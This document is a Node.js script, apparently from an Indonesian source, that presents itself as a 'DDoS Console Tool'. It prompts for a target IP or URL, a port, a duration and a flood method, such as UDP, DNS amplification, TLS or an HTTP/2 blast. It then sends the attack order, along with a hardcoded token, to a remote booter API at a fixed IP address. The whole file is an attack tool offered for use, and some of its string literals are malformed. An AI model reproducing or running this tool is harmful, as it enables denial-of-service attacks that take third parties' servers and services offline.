const readline = require('readline');
const axios = require('axios');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const apiUrl = 'http://37.27.169.207:20835/api';
const token = 'kobosky';

const methods = {
  layer7: [
    "kalimasada",
    "tls",
    "trump",
    "tlsx",
    "bypass",
    "h2-blast",
    "https"
  ],
  layer4: [
    "udp",
    "dns",
    "tcp",
    "fivem",
    "minecraft",
    "ovh-amp",
    "vse"
  ]
};

function ask(q) {
  return new Promise(resolve => rl.question(q, ans => resolve(ans)));
}

(async () => {
  console.log(🛡️  DDoS Console Tool © Mas Vincent);
  console.log(===========================================);

  const layerChoice = await ask(Pilih Layer [4/7]: );
  let layer, availableMethods = [];

  if (layerChoice === '4') {
    layer = 'Layer 4 (L4)';
    availableMethods = methods.layer4;
  } else if (layerChoice === '7') {
    layer = 'Layer 7 (L7)';
    availableMethods = methods.layer7;
  } else {
    console.log('pilihan layer hanya 4/7!');
    rl.close();
    return;
  }

  console.log(\n📋 Metode Tersedia untuk ${layer}:);
  availableMethods.forEach((m, i) => console.log([${i + 1}] ${m}));

  const target = await ask('\n🌐 Masukkan target (IP/URL): ');
  const time = await ask('⏱️  Masukkan durasi serangan (detik): ');
  const port = await ask('🔌 Masukkan port: ');
  const methodIndex = await ask('🧨 Pilih metode (nomor): ');
  const method = availableMethods[parseInt(methodIndex) - 1];

  if (!method) {
    console.error('metode salah pilih angka bukan nama!');
    rl.close();
    return;
  }

  const fullUrl = ${apiUrl}/attack?token=${token}&target=${encodeURIComponent(target)}&time=${time}&method=${method}&port=${port};
  console.log(\n🚀 Menyerang ${target} via ${method.toUpperCase()} (${layer}) selama ${time} detik\n);

  try {
    const res = await axios.get(fullUrl);
    console.log('Respons API:', res.data);
  } catch (err) {
    console.error('rawr:', err.response?.data || err.message);
  }

  rl.close();
})();
